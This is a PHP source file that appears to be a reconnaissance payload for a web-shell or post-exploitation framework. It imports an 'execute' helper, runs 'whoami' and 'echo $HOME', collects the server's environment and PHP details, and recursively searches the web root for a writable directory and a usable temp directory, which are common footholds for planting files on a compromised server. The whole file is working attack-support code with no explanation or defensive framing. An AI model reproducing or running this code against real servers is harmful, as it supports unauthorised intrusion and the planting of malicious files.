<?

!import(execute);
!import(dirAccess);

function getTmpDir(){
    if(!function_exists('sys_get_temp_dir')){
        if(!empty($_ENV['TMP']))$t=$_ENV['TMP'];
        elseif(!empty($_ENV['TMPDIR']))$t=$_ENV['TMPDIR'];
        elseif(!empty($_ENV['TEMP']))$t=$_ENV['TEMP'];
        else{
            $t=@tempnam(":\n\\/?><","dkdk");
            if(@file_exists($t))@unlink($t);
            $t=@dirname($t);}}
    else $t=@sys_get_temp_dir();
    return($t);}


$R = $_SERVER;

$R['PHP_OS']      = PHP_OS;
$R['PHP_VERSION'] = PHP_VERSION;
$R['WHOAMI']      = @execute('whoami');

$tmp = @execute('echo $HOME');
$R['HOME'] = ($tmp!='$HOME' && $tmp) ? $tmp : '';


// GET THE WEB ROOT
$R['WEB_ROOT'] = $R['DOCUMENT_ROOT'];
if(!$R['WEB_ROOT']){
    $R['WEB_ROOT']=$R['APPL_PHYSICAL_PATH'];}
if(!$R['WEB_ROOT']){
    $rel = $R['SCRIPT_NAME'];
    $abs = $R['SCRIPT_FILENAME'];
    if (!$rel || !$abs){
        $rel = $R['PATH_INFO'];
        $abs = $R['PATH_TRANSLATED'];}
    if ($rel && $abs){
        foreach(Array("\\\\","\\","/") as $sep){
            $tmp=str_replace("/",$sep,$rel);
            $len=strlen($tmp);
            if($tmp==substr($abs,-$len)){
                $R['WEB_ROOT']=substr($abs,0,-$len);}}}}
$R['WEB_ROOT'] = @realpath($R['WEB_ROOT']);


// GET A WRITABLE DIR FROM WEB PATH
$MAX_RECURSION=6;
$DIRS=Array($R['WEB_ROOT']);
$R['WRITEABLE_WEBDIR']='';
for ($recLvl=1;$recLvl<=$MAX_RECURSION;$recLvl++){
    foreach($DIRS as $dir){
        if (dirAccess($dir,'w')){
            $R['WRITEABLE_WEBDIR'] = @realpath($dir);
            break(2);}}
    if ($recLvl==$MAX_RECURSION) break;
    $oldDIRS = $DIRS;
    $DIRS = Array();
    foreach($oldDIRS as $dir){
        if ($h = @opendir($dir)){
            while (($elem = readdir($h)) !== FALSE){
                if ($elem != '.' && $elem != '..'){
                    if ((@fileperms($dir.'/'.$elem) & 0x4000) == 0x4000){
                        $DIRS[]=$dir.'/'.$elem;}}}
            closedir($h);}}}


$tmp = getTmpDir();
$R['WRITEABLE_TMPDIR'] = (dirAccess($tmp,'w')) ? $tmp : $R['WRITEABLE_WEBDIR'];


return $R;


?>
